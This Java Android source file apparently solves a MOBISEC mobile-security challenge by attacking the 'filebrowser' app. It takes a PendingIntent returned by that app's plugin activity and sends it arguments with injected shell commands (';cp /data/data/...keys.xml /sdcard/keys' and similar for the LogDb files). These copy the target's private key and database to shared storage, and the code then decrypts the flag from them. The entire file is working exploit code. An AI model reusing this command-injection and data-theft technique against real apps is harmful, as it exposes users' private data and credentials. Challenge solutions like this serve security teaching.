package com.mobisec.filebrowser_attack;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.math.BigInteger;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Timer;
import java.util.TimerTask;
import java.security.Key;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {
    private final static String TAG = "MOBISEC";
    private boolean haveKey = false;
    private boolean haveLog = false;
    private byte[] log = null;
    private byte[] key = null;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (checkSelfPermission("android.permission.WRITE_EXTERNAL_STORAGE")
                != PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE")
                        != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{"android.permission.READ_EXTERNAL_STORAGE",
                            "android.permission.WRITE_EXTERNAL_STORAGE"},
                    1);
            return;
        }
        if (ContextCompat.checkSelfPermission(this,"com.mobisec.filebrowser.permission.PLUGIN") == PackageManager.PERMISSION_DENIED) {
            Log.d(TAG,"requestPermissions");
            ActivityCompat.requestPermissions( this, new String[] {
                            "com.mobisec.filebrowser.permission.PLUGIN"  },
                    1);
        }
//        __deleteOldData();

        Intent i = new Intent();
        i.setComponent(new ComponentName("com.mobisec.filebrowser","com.mobisec.filebrowser.PluginActivity"));
        i.setAction("com.mobisec.browser.action.START_PLUGIN");
        startActivityForResult(i,0);
    }

    private void __deleteOldData(){
        File key = null;
        File database = null;
        // Delete all file in sdcard
        key = new File("/sdcard/keys");
        database = new File("/sdcard/LogDb");

        if(key.exists()){
            Log.w(TAG,"Delete old key");
            key.delete();
        }
        if(database.exists()){
            Log.w(TAG,"Delete old database");
            database.delete();
        }
    }
    private boolean __checkCopySuccess(){
        boolean ret = true;

        File key = new File("/sdcard/keys");
        if(!key.exists()){
            ret = false;
            Log.d(TAG,"Copy key failed.");
        }
        key.exists();

        File database = new File("/sdcard/LogDb");
        if(!database.exists()){
            ret = false;
            Log.d(TAG,"Copy database failed.");
        }

        File database1 = new File("/sdcard/LogDb-wal");
        if(!database1.exists()){
            ret = false;
            Log.d(TAG,"Copy database wal failed.");
        }

        File database2 = new File("/sdcard/LogDb-shm");
        if(!database2.exists()){
            ret = false;
            Log.d(TAG,"Copy database shm failed.");
        }
        database.exists();

        return ret;
    }

    private byte[] __dumbData(String dir){
        File f = new File(dir);
        byte[] context = null;
        try {
            context = Files.readAllBytes(f.toPath());
        } catch (Exception e){
        }
        return context;
    };

    private String __parserKey(String data){
        String[] lines = data.split("\n");
        for(String l : lines){
            if(l.contains("    <string name=\"key\""))
                return l.replace("    <string name=\"key\">","").replace("</string>","");
        }
        return "";
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
        super.onActivityResult(requestCode, resultCode, data);
        Log.d(TAG,"onActivityResult");
        final PendingIntent pi = (PendingIntent)data.getExtras().get("pi");

        final Intent i_ = new Intent();
        i_.putExtra("debug",true);

        final Handler handler = new Handler();

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                // Run cp key
                Log.d(TAG,"Coppy file key");
                i_.putExtra("oper","ls");
                i_.putExtra("arg",";cp /data/data/com.mobisec.filebrowser/shared_prefs/keys.xml /sdcard/keys");
                try {
                    pi.send(MainActivity.this,400,i_);
                } catch (Exception e){
                }
            }
        }, 5000);

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                Log.d(TAG,"Coppy file LogDb");
                i_.putExtra("oper","du");
                i_.putExtra("arg",";cp /data/data/com.mobisec.filebrowser/databases/LogDb /sdcard/LogDb");
                try {
                    pi.send(MainActivity.this,400,i_);
                } catch (Exception e){
                }
            }
        }, 2000);
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                Log.d(TAG,"Coppy file LogDb-wal");
                i_.putExtra("oper","ls");
                i_.putExtra("arg",";cp /data/data/com.mobisec.filebrowser/databases/LogDb-wal /sdcard/LogDb-wal");
                try {
                    pi.send(MainActivity.this,400,i_);
                } catch (Exception e){
                }
            }
        }, 3000);
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                Log.d(TAG,"Coppy file LogDb-shm");
                i_.putExtra("oper","ls");
                i_.putExtra("arg",";cp /data/data/com.mobisec.filebrowser/databases/LogDb-shm /sdcard/LogDb-shm");
                try {
                    pi.send(MainActivity.this,400,i_);
                } catch (Exception e){
                }
            }
        }, 4000);


        new Timer().scheduleAtFixedRate(new TimerTask() {
            public void run() {

                byte[] key;
                byte[] db;
                byte[] db_;
                byte[] db_shm;
                byte[] db_wal;
                String keyraw = "";
                byte[] aesKey = null;
                String EncOper = "";
                if (__checkCopySuccess()){
                    key = __dumbData("/sdcard/keys");
                    db_ = __dumbData("/sdcard/LogDb");
                    db_shm = __dumbData("/sdcard/LogDb-shm");
                    db_wal = __dumbData("/sdcard/LogDb-wal");
                    keyraw = __parserKey(new String(key));

                    db = new byte[db_.length + db_shm.length + db_wal.length];
                    System.arraycopy(db_,   0,db,0                       ,db_.length);
                    System.arraycopy(db_shm,0,db,db_.length                      ,db_shm.length);
                    System.arraycopy(db_wal,0,db,db_.length+db_shm.length,db_wal.length);
                    try {
                        Log.d(TAG,"keyraw: " + keyraw);
                        aesKey = getAesKey(keyraw);
                        Log.d(TAG,"aesKey: " + bin2hex(aesKey));
                        EncOper = bin2hex(encrypt("genflag".getBytes(),aesKey));
                        Log.d(TAG,"EncOper: " + EncOper);

                        if(indexOf(db,EncOper.getBytes())!=-1){
                            int i = indexOf(db,EncOper.getBytes());
                            Log.d(TAG,"Found it at " + i);
                            byte[] data_;
                            String dataDecrypt = null;
                            try {
                                data_ = Arrays.copyOfRange(db,i+32,i+32+32);
                                Log.d(TAG,"data " + new String(data_));
                                dataDecrypt = new String (decrypt(hex2bin(new String(data_)),aesKey));
                                Log.d(TAG,"dataDecrypt " + dataDecrypt);
                            } catch (Exception e){Log.d(TAG,"e "+ e);}
                            try {
                                data_ = Arrays.copyOfRange(db,i+32,i+32+64);
                                Log.d(TAG,"data " + new String(data_));
                                dataDecrypt = new String (decrypt(hex2bin(new String(data_)),aesKey));
                                Log.d(TAG,"dataDecrypt " + dataDecrypt);
                            } catch (Exception e){Log.d(TAG,"e "+ e);}
                            try {
                                data_ = Arrays.copyOfRange(db,i+32,i+32+96);
                                Log.d(TAG,"data " + new String(data_));
                                dataDecrypt = new String (decrypt(hex2bin(new String(data_)),aesKey));
                                Log.d(TAG,"dataDecrypt " + dataDecrypt);
                            } catch (Exception e){Log.d(TAG,"e "+ e);}
                            try {
                                data_ = Arrays.copyOfRange(db,i+32,i+32+128);
                                Log.d(TAG,"data " + new String(data_));
                                dataDecrypt = new String (decrypt(hex2bin(new String(data_)),aesKey));
                                Log.d(TAG,"dataDecrypt " + dataDecrypt);
                            } catch (Exception e){Log.d(TAG,"e "+ e);}
                            try {
                                data_ = Arrays.copyOfRange(db,i+32,i+32+128+32);
                                Log.d(TAG,"data " + new String(data_));
                                dataDecrypt = new String (decrypt(hex2bin(new String(data_)),aesKey));
                                Log.d(TAG,"dataDecrypt " + dataDecrypt);
                            } catch (Exception e){Log.d(TAG,"e "+ e);}
                            try {
                                data_ = Arrays.copyOfRange(db,i+32,i+32+128+64);
                                Log.d(TAG,"data " + new String(data_));
                                dataDecrypt = new String (decrypt(hex2bin(new String(data_)),aesKey));
                                Log.d(TAG,"dataDecrypt " + dataDecrypt);
                            } catch (Exception e){Log.d(TAG,"e "+ e);}
                        }
                    } catch ( Exception e)
                    {
                        Log.d(TAG,"e "+ e);
                    }
                }
            }
        }, 6000, 2000);

    }

    private int indexOf(byte[] outerArray, byte[] smallerArray) {
        for(int i = 0; i < outerArray.length - smallerArray.length+1; ++i) {
            boolean found = true;
            for(int j = 0; j < smallerArray.length; ++j) {
                if (outerArray[i+j] != smallerArray[j]) {
                    found = false;
                    break;
                }
            }
            if (found) return i;
        }
        return -1;
    }

    private static byte[] getAesKey(String key) throws Exception {
        return hash(key.getBytes());
    }

    public static byte[] hash(byte[] in) throws Exception {
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(in);
        return md.digest();
    }
    static String bin2hex(byte[] data) {
        return String.format("%0" + (data.length * 2) + 'x', new BigInteger(1, data));
    }
    public static byte[] encrypt(byte[] in, byte[] key) throws Exception {
//        Log.d(TAG,"encrypt in length : " + in.length);
//        Log.d(TAG,"encrypt key length : " + key.length);
        Key aesKey = new SecretKeySpec(key, "AES");
        Cipher encryptCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        encryptCipher.init(1, aesKey);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        CipherOutputStream cipherOutputStream = new CipherOutputStream(outputStream, encryptCipher);
        cipherOutputStream.write(in);
        cipherOutputStream.flush();
        cipherOutputStream.close();
        return outputStream.toByteArray();
    }

    public static byte[] decrypt(byte[] ct, byte[] key) throws Exception {
//        Log.d(TAG,"decrypt ct length : " + ct.length);
//        Log.d(TAG,"decrypt key length : " + key.length);
        Key aesKey = new SecretKeySpec(key, "AES");
        Cipher encryptCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        encryptCipher.init(2, aesKey);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        CipherOutputStream cipherOutputStream = new CipherOutputStream(outputStream, encryptCipher);
        cipherOutputStream.write(ct);
        cipherOutputStream.flush();
        cipherOutputStream.close();
        return outputStream.toByteArray();
    }
    public static byte[] hex2bin(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }

    private static int digit(char ch) {
        int r = Character.digit(ch, 16);
        if (r >= 0) {
            return r;
        }
        throw new NumberFormatException("Invalid hexadecimal string: " + ch);
    }
}